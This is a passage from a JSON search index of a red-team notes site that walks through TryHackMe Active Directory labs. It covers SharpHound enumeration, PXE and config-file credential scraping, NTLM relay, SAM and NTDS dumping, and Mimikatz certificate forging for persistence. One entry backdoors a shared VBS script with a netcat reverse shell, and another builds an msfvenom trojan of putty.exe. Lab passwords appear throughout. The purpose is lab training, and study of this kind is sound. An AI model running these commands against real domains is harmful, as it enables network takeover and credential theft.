sekurlsa::pth /user:Administrator...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8239fe7cc428a764d7a64693a8826c23",
    "u": "https://ad.tymyrddin.dev/docs/enum/cleanup",
    "t": "Cleanup ",
    "c": "Cleanup  Remove the sharphound zip and directory. Close bloodhound. Stop neo4j: neo4j stop To stop the vpn daemon started in setup , get PID: sudo ps aux | grep -v grep | grep -i <username>-adenumeration.ovpn | awk -v FS=' ' '{print $2}' <PID> and kill the process: sudo kill -9 <PID> Remove the IP address of the THMDC in DNS IPv4 setting and run: sudo systemctl restart NetworkManager Done.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "96abb3df713940a6a67acbc0985ffd9e",
    "u": "https://ad.tymyrddin.dev/docs/enum/bloodhound",
    "t": "Through Bloodhound ",
    "c": "Through Bloodhound  Bloodhound runs locally on an attacker’s machine. The attacker must run a “collector” like sharphound on the target to enumerate domain information. After the collector finishes running, it will output a series of .json files for import into the Bloodhound interface. On the attack machine: mkdir sharphound cd sharphound wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip --2022-10-12 14:20:23-- https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip ... HTTP request sent, awaiting response... 200 OK Length: 2138953 (2.0M) [application/octet-stream] Saving to: ‘SharpHound-v1.1.0.zip’ SharpHound-v1.1.0.z 100%[===================>] 2.04M 1.91MB/s in 1.1s 2022-10-12 14:20:35 (1.91 MB/s) - ‘SharpHound-v1.1.0.zip’ saved [2138953/2138953] Start a server to serve it: python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Now ssh into target machine using the credentials given: ssh kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com In the target machine terminal, switch to powershell: za\\kenneth.davies@THMJMP1 C:\\Users\\kenneth.davies\\Documents>powershell Choose a directory to work from (I used Documents , and download the SharpHound-v1.1.0.zip from the http server on the attack machine: PS C:\\Users\\kenneth.davies\\Documents> Invoke-WebRequest http://10.50.16.168/SharpHound-v1.1.0.zip -OutFile SharpHound-v1.1.0.zip Extract: PS C:\\Users\\kenneth.davies\\Documents> Expand-Archive SharpHound-v1.1.0.zip Enumerate: PS C:\\Users\\kenneth.davies\\Documents> cd SharpHound-v1.1.0 PS C:\\Users\\kenneth.davies\\Documents\\SharpHound-v1.1.0> .\\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs 2022-10-12T14:49:52.7476245+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound ... 2022-10-12T14:50:42.7872718+01:00|INFORMATION|SharpHound Enumeration Completed at 2:50 PM on 10/12/2022! Happy Graphing! Get name of results: PS C:\\Users\\kenneth.davies\\Documents\\SharpHound-v1.1.0> dir Directory: C:\\Users\\kenneth.davies\\Documents\\SharpHound-v1.1.0 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/12/2022 2:50 PM 139831 20221012145038_BloodHound.zip ... On the attack machine, use ssh to copy the bloodhound results over: scp kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com:C:/Users/kenneth.davies/Documents/SharpHound-v1.1.0/20221012145038_BloodHound.zip . Fire up neo4j and bloodhound : sudo neo4j start bloodhound & Drop the copied over results in the bloodhound window, and play around with options. Start playing around and answer the questions. Use Search for a node... to find specific users, groups, etc. Click on specific properties of an object to visualise it Use the Analysis tab to run built-in queries …",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6d7e57e9e8e0f823a495f6ef00c405ef",
    "u": "https://ad.tymyrddin.dev/docs/breach/mdt",
    "t": "Microsoft Deployment Toolkit ",
    "c": "Microsoft Deployment Toolkit  Large organisations need tools to deploy and manage the infrastructure of the estate. In massive organisations, you can’t have your IT personnel running around with DVDs or USB Flash for installing software on every single machine. Microsoft Deployment Toolkit (MDT) is used to deploy operating systems over the network using PXE boot; SCCM is used to manage hosts after they’ve been provisioned. Both of these technologies have the advantage of being a centralised management system for hosts. And, they also represent a massive attack surface. If an attacker can pretend to be a PXE booting client on the network and request an image from MDT via a DHCP request, then the attacker could inject or scrape information from the PXE image during and after the setup process. SSH into the jump host with password Password1@ : ssh thm@THMJMP1.za.tryhackme.com Create a working directory for the session using your username and copy the powerpxe directory into it: powershell -ep bypass mkdir Barzh cd Barzh cp -Recurse C:\\powerpxe . Go to http://pxeboot.za.tryhackme.com/ Pretend to be a PXE client sending a DHCP request and receiving a list of BCD files for configuration. Copy the file name. Use TFTP to connect to the MDT server and retrieve the BCD file and scrape it for credentials: tftp -i (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress GET \"\\Tmp\\x64{BFA810B9-DF7D-401C-B5B6-2F4D37258344}.bcd\" conf.bcd Now have downloaded the BCD file and copied the powerpxe folder. Get the location of the WIM file, the Windows bootable image. Import-Module .\\powerpxe\\PowerPXE.ps1 $bcdfile = \"conf.bcd\" Get-WimFile -bcdFile $bcdfile >> Parse the BCD file: conf.bcd >>>> Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim \\Boot\\x64\\Images\\LiteTouchPE_x64.wim We know the path to download the image: $wimfile = '\\Boot\\x64\\Images\\LiteTouchPE_x64.wim' $mdtserver = (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress tftp -i $mdtserver GEt \"$wimfile\" pxeboot.wim Transfer successful: 341899611 bytes in 277 second(s), 1234294 bytes/s Scrape the image for credentials: Get-FindCredentials -WimFile .\\pxeboot.wim >>>> Finding Bootstrap.ini >>>> >>>> DeployRoot = \\\\THMMDT\\MTDBuildLab$ >>>> >>>> UserID = svcMDT >>>> >>>> UserDomain = ZA >>>> >>>> UserPassword = PXEBootSecure1@",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d9ce460772bcbe2e0da49eaae42665ff",
    "u": "https://ad.tymyrddin.dev/docs/persist/acls",
    "t": "Persistence through ACLs ",
    "c": "Persistence through ACLs  Active Directory has a process called SDProp that replicates a template called AdminSDHolder to all protected groups in the domain. If an attacker adds their user account to the AdminSDHolder template, SDProp will replicate the ACL to all the protected groups when it runs every 60 minutes. So even if the attacker is removed from privileged groups, they will be re-added at very cycle by SDProp . RDP to thmwrk1 with the unprivileged user account: xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'user.name' /p:'Password' Inject the network credentials of the domain administrator into a session: runas /netonly /user:za.tryhackme.loc\\Administrator cmd.exe Modify the AdminSDHolder template  From the command prompt running with the injected domain admin credential, run mmc.exe . Go to File -> Add/Remove Snap-in Add the Active Directory Users and Computers snap-in. Add the unprivileged user to the ACL here and allow Full Control for the user. Manually start the SDProp sync procedure. WinRM to the Domain Controller  In the injected session, enter a PowerShell session: powershell -ep bypass WinRM to the domain controller as the DA: Enter-PSSession -ComputerName thmdc.za.tryhackme.loc Now running a PowerShell session on the domain controller: Import-Module C:\\Tools\\Invoke-ADSDPropagation.ps1 Invoke-ADSDPropagation",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "95e32a08fb46c6f4e89881a63a177cd6",
    "u": "https://ad.tymyrddin.dev/docs/exploit/gpos",
    "t": "Exploiting GPOs ",
    "c": "Exploiting GPOs  The KeePass vault from the users post-exploit step revealed a service account credential. Searching for this user in the Bloodhound data reveals an interesting ownership over a GPO. GPOs are saved in the SYSVOL directory when they are synchronized from the domain controller. RDP into THMWRK1 as standard domain user or T2 admin Inject the svcServMan as a network credential Edit the GPO remotely on THMSERVER2 via MMC THMWRK1  RDP to THMWRK1: xfreerdp /v:thmwrk1.za.tryhackme.loc /u:t2_alan.riley /p:'Password123' Inject the Service Account Credentials (password = Sup3rStr0ngPass!@) runas /netonly /user:za.tryhackme.loc\\svcServMan cmd.exe mmc.exe Modify the Group Policy Object: Add Group -> Browse -> Search “IT Support” -> Click OK Make group a member of “IT Support” Administrators and Remote Desktop Users on THMSERVER2 This group policy applies to the path za.tryhackme.loc/Servers/Management Servers , as specified in the GPO path. Add the Active Directory Users and Computers snap-in to the mmc.exe session, and inspect the OU. THMWRK2  Use the low-level user credential received from http://distributor.za.tryhackme.loc/creds. This user is a member of the IT Support group after we added the user in Exploiting permission delegation",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ac1ea874a898c587bf31bb6dce714320",
    "u": "https://ad.tymyrddin.dev/docs/enum/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<username>-adenumeration.ovpn --daemon Check PID (you get a number, if not, doesn’t work): sudo ps aux | grep -v grep | grep -i <username>-adenumeration.ovpn | awk -v FS=' ' '{print $2}' Set your DNS IPv4 to the IP address of the THMDC in the network diagram, and run: sudo systemctl restart NetworkManager Test: nslookup thmdc.za.tryhackme.com Get your credentials from http://distributor.za.tryhackme.com/creds . You can now either login with ssh , for example: $ ssh kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com ... kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com's password: Microsoft Windows [Version 10.0.17763.1098] (c) 2018 Microsoft Corporation. All rights reserved. Or by RPD: The kali-share drive mounts the current working directory as a network drive in the RDP session, for uploading and downloading files.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1cc2c978cadaae2d9c31c8516e73bb6e",
    "u": "https://ad.tymyrddin.dev/docs/exploit/relays",
    "t": "Exploiting automated relays ",
    "c": "Exploiting automated relays  We can force a computer account to initiate an authentication request. Computer accounts – like user accounts – have a username and password. Computer account usernames end in $ – for example, server01$ . Machine accounts  Use a custom Bloodhound query to find computer accounts that have admin rights over other computer accounts: MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p This query will attempt to find instances where a computer has the \"AdminTo\" relationship over another computer. The Printer Bug  The printer bug feature allows a domain user to force a computer account to connect to an arbitrary IP address. In order for this to work, the following must be true: Possess a valid set of AD credentials Target host is running SMB Target host is running Print Spooler service SMB signing must not be enforced Condition 1 and 2 have been met already. Verify the Print Spooler service is running  PS C:\\Users\\t2_alan.riley> Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc Name ComputerName Description PortMonitor ---- ------------ ----------- ----------- COM1: thmserver2.za.try... Local Port Local Monitor COM2: thmserver2.za.try... Local Port Local Monitor COM3: thmserver2.za.try... Local Port Local Monitor COM4: thmserver2.za.try... Local Port Local Monitor FILE: thmserver2.za.try... Local Port Local Monitor LPT1: thmserver2.za.try... Local Port Local Monitor LPT2: thmserver2.za.try... Local Port Local Monitor LPT3: thmserver2.za.try... Local Port Local Monitor PORTPROMPT: thmserver2.za.try... Local Port Local Monitor Verify SMB signing enforcement  $ sudo nmap -Pn -p445 --script=smb2-security-mode thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc [sudo] password for nina: Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 18:24 GMT Nmap scan report for thmserver1.za.tryhackme.loc (10.200.60.201) Host is up (0.080s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb2-security-mode: | 311: |_ Message signing enabled but not required Nmap scan report for thmserver2.za.tryhackme.loc (10.200.60.202) Host is up (0.041s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb2-security-mode: | 311: |_ Message signing enabled but not required Nmap done: 2 IP addresses (2 hosts up) scanned in 2.85 seconds $ dig thmserver1.za.tryhackme.loc ; <<>> DiG 9.18.7-1-Debian <<>> thmserver1.za.tryhackme.loc ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14249 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;thmserver1.za.tryhackme.loc. IN A ;; ANSWER SECTION: thmserver1.za.tryhackme.loc. 3600 IN A 10.200.60.201 ;; Query time: 68 msec ;; SERVER: 10.200.60.101#53(10.200.60.101) (UDP) ;; WHEN: Mon Nov 07 18:26:01 GMT 2022 ;; MSG SIZE rcvd: 72 Exploit authentication relay  Use NTLM authentication against the target – THMSERVER1 THMSERVER2 has administrative privileges over THMSERVER1 Use SpoolSample.exe to connect to THMSERVER2 and tell it to authenticate back to us Relay that authentication request to THMSERVER1 THMSERVER1 will see it as though we are connecting as THMSERVER2 , which will give us administrative privileges Set up the NTLM relay: $ python3 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://\"10.200.60.201\" -debug Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation [+] Impacket Library Installation Path: /usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220720.103933.3c6713e3-py3.10.egg/impacket ... [*] Servers started, waiting for connections Get IP address attack machine on the THM network: $ ifconfig ... exploitingad: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500 inet 10.50.57.175 netmask 255.255.255.0 destination 10.50.57.175 inet6 fe80::712c:cfa0:413f:458f prefixlen 64 scopeid 0x20<link> unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC) RX packets 53151 bytes 19626273 (18.7 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 61363 bytes 4371437 (4.1 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ... On THMWRK1 , exploit: PS C:\\Users\\t2_alan.riley> C:\\Tools\\SpoolSample.exe thmserver2.za.tryhackmloc \"10.50.57.175\" [+] Converted DLL to shellcode [+] Executing RDI [+] Calling exported function TargetServer: \\\\thmserver2.za.tryhackmloc, CaptureServer: \\\\10.50.57.175 A hashdump.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "aa2a007ed722013a27ae46faa643de33",
    "u": "https://ad.tymyrddin.dev/docs/exploit/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Exploiting Active Directory What?  Common AD exploitation techniques: A combination of lateral movement and privilege escalation. Why?  Reaching a suitable position to execute goals. How?  Setup for THM AD Exploiting permission delegation Exploiting kerberos delegation Exploiting automated relays Exploiting AD users Exploiting GPOs Exploiting certificates Exploiting domain trusts",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5fb18e6d06492e837c11189b46e41d68",
    "u": "https://ad.tymyrddin.dev/docs/pivot/cleanup",
    "t": "Cleanup ",
    "c": "Cleanup  To stop the vpn daemon started in setup , get PID: sudo ps aux | grep -v grep | grep -i <username>-lateralmovementandpivoting | awk -v FS=' ' '{print $2}' <PID> and kill the process: sudo kill -9 <PID> Remove the IP address of the THMDC in DNS IPv4 setting and run: sudo systemctl restart NetworkManager Done.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "574783abcaa7e2a42bb606f34c6e424a",
    "u": "https://ad.tymyrddin.dev/docs/persist/certs",
    "t": "Persistence through certificates ",
    "c": "Persistence through certificates  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. In Exploiting certificates , certificates were leveraged to become Domain Admins. Certificates can also be used for persistence. This attack revolves around taking the private key of the Certificate Authority (CA) of the domain. Armed with the private key, the attacker can now effectively “approve” their own Certificate Signing Requests (CSRs) and generate certificates to any user they please. In Kerberos authentication, a user can authenticate by providing their public key. SSH to the domain controller using the given domain administrator credential . Since the Active Directory Certificate Services (AD CS) services is running on the domain controller, the attack is executed on this host. ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Extract the CA’s Private Key  powershell -ep bypass Start Mimikatz: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe Enumerate certificates mimikatz # crypto::certificates /systemstore:local_machine Elevate privileges: mimikatz # privilege::debug Allow certificate export without private key: mimikatz # crypto::capi mimikatz # crypto::cng Export the certificates with private keys: mimikatz # crypto::certificates /systemstore:local_machine /export Exit: mimikatz # exit Create a certificate for the domain administrator account  List the certificate files. local_machine_My_1_za-THMDC-CA.pfx is the CA’s certificate with the private key: Get-ChildItem .\\*.pfx C:\\Tools\\ForgeCert\\ForgeCert\\ForgeCert.exe --CaCertPath .\\local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject 'CN=Pwned' --SubjectAltName 'Administrator@za.tryhackme.loc' --NewCertPath .\\domain-admin.pfx --NewCertPassword pwned123 Create the TGT using Rubeus and save it locally: C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:'.\\domain-admin.pfx' /password:'pwned123' /outfile:domain-admin.kirbi /domain:za.tryhackme.loc /dc:10.200.88.101 Use Mimikatz to inject the ticket into the session: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # kerberos::ptt domain-admin.kirbi Exit: mimikatz # exit Browse: dir \\\\thmdc.za.tryhackme.loc\\C$\\Users",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "342b50c6ff2a847f9dfa18c5436e6e85",
    "u": "https://ad.tymyrddin.dev/docs/harvest/lwc",
    "t": "Local Windows credentials ",
    "c": "Local Windows credentials  Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. And, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can use keylogging with tools like the Metasploit framework. An example use case can be found in Exploiting AD users . Security Account Manager (SAM)  The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. It can not be read and accessed by any users while the Windows operating system is running. And there are ways and attacks to dump the content of the SAM database. The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. Another approach uses the Microsoft Volume shadow copy service , which helps perform a volume backup while applications read/write on volumes. Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some SAM database contents to be used by Windows services. Shadow Copy  Use wmic (with administrator privileges) to create a shadow volume copy: Run the standard cmd.exe prompt with administrator privileges. Execute the wmic command to create a copy shadow of C: drive Verify the creation from step 2 is available. Copy the SAM database from the volume created in step 2 Copy shadow of C: drive: C:\\Users\\Administrator>wmic shadowcopy call create Volume='C:\\' To list and confirm that we have a shadow copy of the C: volume: C:\\Users\\Administrator>vssadmin list shadows A shadow copy volume was created: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 The SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need the decryption key stored in c:\\Windows\\System32\\Config\\system . Copy both files (sam and system) from the shadow copy volume to the desktop, and then to the attack machine. Registry Hives  Save the value of the Windows registry using the reg.exe tool (with Administrator privileges): C:\\Users\\Administrator\\Desktop>reg save HKLM\\sam C:\\users\\Administrator\\Desktop\\sam-reg C:\\Users\\Administrator\\Desktop>reg save HKLM\\system C:\\users\\Administrator\\Desktop\\system-reg Decrypt it using secretsdump.py: # python3 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "411116b699485ee4e9ddc3648a2eb2fd",
    "u": "https://ad.tymyrddin.dev/docs/pivot/behaviour",
    "t": "Abusing user behaviour ",
    "c": "Abusing user behaviour  Writable Shares  Discover a globally writable share Discovers credentials that allow access to a writable share As the share is enumerated, there are scripts or executable files on the server that may be run by several users. When a user runs the executable: A copy of the script/executable is made to a temporary directory on the user’s computer The executable is run on the user’s computer – not the server hosting the share This increases the attack surface for anyone with access to the share and executable files. Backdooring .vbs Scripts  If the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script: CreateObject(\"WScript.Shell\").Run \"cmd.exe /c copy /Y \\\\FILE-SERVER-IP\\share_name\\nc64.exe %tmp% & %tmp%\\nc64.exe -e cmd.exe <IP address attack machine> 80\", 0, True If a user runs this from the file share, the script will: Copy nc64.exe from the file server to the user’s temporary directory Give a reverse shell by executing nc64.exe and connecting to the attacker’s IP address on a specified port. Backdooring .exe Files  If the shared file is a Windows binary, say putty.exe, it can be downloaded from the share and be injected with a backdoor (msfvenom makes it easy): Copy the binary from the file share to the attack machine Use it as a template to create an imposter Place the imposter on the file share Start a listener and wait for it Create a malicious binary (noticeable by AV by the way): msfvenom -a x64 --platform windows -x /tmp/filename.exe -k -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=80 -b '\\x00' -f exe -o filename.exe RDP Session hijacking  When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, the session will remain open on the server indefinitely. With SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password. On Windows Server 2019 and newer, the attacker must know the password used to create the RDP session. Logged in as the Administrator and running a shell as NT AUTHORITY\\SYSTEM : C:\\> query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME >administrator rdp-tcp#6 2 Active . 4/1/2022 4:09 AM luke 3 Disc . 4/6/2022 6:51 AM For a RDP session that was not cleanly logged off and is suspended, attach it to the existing session, for example: tscon 3 /dest:rdp-tcp#6 Flag  Get a new set of credentials from http://distributor.za.tryhackme.com/creds_t2. Connect to THMJMP2 via RDP hijack t1_toby.beck ’s RDP session on THMJMP2 to get your flag. Hijack a session marked as disconnected (Disc.) to avoid interfering with other users.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "fdd910dbe4f2e99ce542fe0d97b14034",
    "u": "https://ad.tymyrddin.dev/docs/breach/config",
    "t": "Configuration files ",
    "c": "Configuration files  Suppose a breach that gave access to a host on the organisation’s network. In that case, configuration files are an excellent avenue to explore further for recovering (more) AD credentials. Depending on the host that was breached, configuration files may be available for such enumeration: Web application config files Service configuration files Registry keys Centrally deployed applications Eumeration scripts like Seatbelt could be used to automate this process. Configuration file credentials  The example here is the McAfee Enterprise Endpoint Security application, an endpoint detection and response (EDR) agent. The application stores an Active Directory credential in the C:\\ProgramData\\McAfee\\Agent\\DB\\ma.db file, which could be read by an attacker who has managed to gain a foothold on a host where this application is installed. The ma.db file is a SQLite file which can be read using the sqlite3 utility or the sqlitebrowser tool. We can use the SSH access on the jump host THMJMP1 again. Also, download the Python 2 script to crack the password hash. Secure Copy the File, using the password: Password1@ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db ma.db Inspect the data using sqlitebrowser or sqlite3 . Got to the AGENT_REPOSITORIES table and check out the DOMAIN , AUTH_USER , and AUTH_PASSWD columns. sqlite3 ./ma.db # List the tables in the database sqlite> .tables AGENT_CHILD AGENT_PROXIES MA_DATACHANNEL_MESSAGES AGENT_LOGS AGENT_PROXY_CONFIG AGENT_PARENT AGENT_REPOSITORIES # Dump the table schema sqlite> .schema AGENT_REPOSITORIES CREATE TABLE AGENT_REPOSITORIES(NAME TEXT NOT NULL UNIQUE, REPO_TYPE INTEGER NOT NULL, URL_TYPE INTEGER NOT NULL, NAMESPACE INTEGER NOT NULL, PROXY_USAGE INTEGER NOT NULL, AUTH_TYPE INTEGER NOT NULL, ENABLED INTEGER NOT NULL, SERVER_FQDN TEXT, SERVER_IP TEXT, SERVER_NAME TEXT,PORT INTEGER, SSL_PORT INTEGER,PATH TEXT, DOMAIN TEXT, AUTH_USER TEXT, AUTH_PASSWD TEXT, IS_PASSWD_ENCRYPTED INTEGER NOT NULL, PING_TIME INTEGER NOT NULL, SUBNET_DISTANCE INTEGER NOT NULL, SITELIST_ORDER INTEGER NOT NULL, STATE INTEGER NOT NULL, PRIMARY KEY (NAME) ON CONFLICT REPLACE); # Select the desired columns from the table sqlite> SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES; za.tryhackme.com|svcAV|jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== # Exit sqlite3 sqlite> .quit We have the account username, svcAV , and an encrypted password stored as a base64 string. Reverse the encrypted password and use the script provided in the exercise files to crack it. encrypted_pw='jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==' python2 ./mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py $encryped_pw The svcAV user account has password MyStrongPassword!",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "14994253874745013902cfd8d9d5460b",
    "u": "https://ad.tymyrddin.dev/docs/persist/gpos",
    "t": "Persistence through GPOs ",
    "c": "Persistence through GPOs  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes configuration such as membership to restricted groups, firewall and AV configuration, and which scripts should be executed upon startup. While this is an excellent tool for management, it can be targeted by attackers to deploy persistence across the entire estate. What is even worse is that the attacker can often hide the GPO in such a way that it becomes almost impossible to remove it. Common GPO Persistence Techniques Restricted Group Membership Logon Script Deployment Firewall Tampering Anti-Virus Tampering Resources  Sneaky Active Directory Persistence #17: Group Policy",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "60e0c38e4da5d4e63aec991ddf93519c",
    "u": "https://ad.tymyrddin.dev/docs/harvest/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Techniques for obtaining credentials like login information, account names, and passwords by extracting credential information from a system in various locations such as clear-text files, registry, memory dumping, etc. Why?  As a red teamer, gaining access to legitimate credentials has benefits: It can give access to systems (Lateral Movement). It makes it harder to detect our actions. It provides the opportunity to create and manage accounts to help achieve the end goals of a red team engagement. How?  Credential access Local Windows credentials Local Security Authority Subsystem Service Windows Credential Manager Domain Controller Local Administrator Password Solution Hashes and tickets",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "317b0c274ec1dc9dba591ab421436bd2",
    "u": "https://ad.tymyrddin.dev/docs/enum/injection",
    "t": "Credential injection ",
    "c": "Credential injection  There may be Active Directory credentials when we’ve landed a foothold on an unjoined host. We could try to use the network session to enumerate SYSVOL on the domain controller runas.exe /netonly /user:domain.tld\\username cmd.exe /netonly - use the credentials for network sessions only, all other commands run in the current user session on the local host /user - the user we want to authenticate as in network sessions cmd.exe spawn a new command prompt window with the injected network credential And enumerate SYSVOL : dir \\\\za.tryhackme.com\\SYSVOL Enumerating SYSVOL",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c0b0e2e0d5870ba02b9dca3339f80828",
    "u": "https://ad.tymyrddin.dev/docs/harvest/dc",
    "t": "Domain Controller ",
    "c": "Domain Controller  NTDS  NTDS is located in C:\\Windows\\NTDS by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. And there are various ways to gain access to it. Get a copy of the NTDS file using the ntdsutil and Diskshadow tool and dump the file’s content. Decrypting the NTDS file requires a system Boot Key to decrypt LSA Isolated credentials. The Boot Key is stored in the SECURITY file system. Ntdsutil  Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios: Restore deleted objects in Active Directory. Perform maintenance for the AD database. Active Directory snapshot management. Set Directory Services Restore Mode (DSRM) administrator passwords. Local Dumping (No Credentials)  This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller. To successfully dump the content of the NTDS file we need the following files: C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SECURITY To dump the NTDS file using the Ntdsutil tool in the C:\\temp directory: powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q\" The c:\\temp directory now has two folders: Active Directory and registry, which contain the three files we need. Transfer them to the attack machine and run the secretsdump.py script to extract the hashes from the dumped memory file. c:\\temp\\Active Directory>scp .\\ntds.dit nina@10.18.22.77:/home/nina/Downloads/last/ The authenticity of host '10.18.22.77 (10.18.22.77)' can't be established. ECDSA key fingerprint is SHA256:RMXbGfqwBW5FiYWOSV2vVgv3+ypBISNAIlY/qZawIJ0. Are you sure you want to continue connecting (yes/no)? Warning: Permanently added '10.18.22.77' (ECDSA) to the list of known hosts. nina@10.18.22.77's password: ntds.dit 100% 24MB 1.2MB/s 00:20 c:\\temp\\Active Directory>cd ..\\registry c:\\temp\\registry>dir Volume in drive C has no label. Volume Serial Number is A8A4-C362 Directory of c:\\temp\\registry 11/10/2022 01:53 AM <DIR> . 11/10/2022 01:53 AM <DIR> .. 06/13/2022 09:40 AM 65,536 SECURITY 06/13/2022 09:40 AM 20,971,520 SYSTEM 2 File(s) 21,037,056 bytes 2 Dir(s) 10,265,694,208 bytes free c:\\temp\\registry>scp .\\SECURITY nina@10.18.22.77:/home/nina/Downloads/last/ nina@10.18.22.77's password: SECURITY 100% 64KB 455.2KB/s 00:00 c:\\temp\\registry>scp .\\SYSTEM nina@10.18.22.77:/home/nina/Downloads/last/ nina@10.18.22.77's password: SYSTEM 100% 20MB 1.2MB/s 00:17 c:\\temp\\registry> Extract hashes from NTDS locally: $ ls ntds.dit SECURITY 